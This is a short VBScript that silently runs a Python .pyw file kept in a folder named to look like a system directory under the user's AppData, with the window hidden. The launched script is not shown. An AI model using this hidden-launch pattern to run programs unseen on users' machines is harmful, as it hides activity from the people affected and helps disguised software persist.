' Create a WScript Shell object
Set objShell = CreateObject("WScript.Shell")

' Get the current user's profile directory
userProfileDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

' Construct the paths to the Python interpreter and .pyw file
pythonExePath = userProfileDir & "\AppData\Local\Programs\Python\Python311\python.exe"
pywFilePath = userProfileDir & "\AppData\System\BN.pyw"

' Define the command to run the .pyw file
command = """" & pythonExePath & """ """ & pywFilePath & """"

' Run the command (your .pyw file)
objShell.Run command, 0, False
